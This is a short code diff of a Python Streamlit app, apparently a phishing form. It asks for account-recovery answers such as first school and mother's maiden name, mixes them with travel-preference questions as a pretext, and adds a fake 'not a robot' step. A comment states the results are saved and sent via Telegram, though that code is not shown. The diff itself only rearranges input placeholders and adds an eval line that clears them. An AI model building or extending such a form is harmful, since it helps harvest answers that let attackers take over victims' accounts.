@@ -15,9 +15,12 @@ ph1 = st.empty()
 ph1.write('Please answer the security questions:')
 ph2 = st.empty()
 school = ph2.text_input('Name of your first school?')
-mom_name = st.text_input('Mother''s maiden name?')
-type = st.text_input('Urban or beach vibe?')
-hotel = st.text_input('Fancy Boho chic hotel or airbnb in a secluded beach?')
+ph3 = st.empty()
+mom_name = ph3.text_input('Mother''s maiden name?')
+ph4 = st.empty()
+type = ph4.text_input('Urban or beach vibe?')
+ph5 = st.empty()
+hotel = ph5.text_input('Fancy Boho chic hotel or airbnb in a secluded beach?')
 
 # save results to csv and send via telegram
 
@@ -30,6 +33,7 @@ signupbut = placeholder.button('Sign Up')
 
 if signupbut:
     placeholder.empty()
+    [eval('ph%s.empty()' % i) for i in range(1,6)]
     ph1.empty()
     ph2.empty()
     st.write('Please confirm you''re not a robot:')
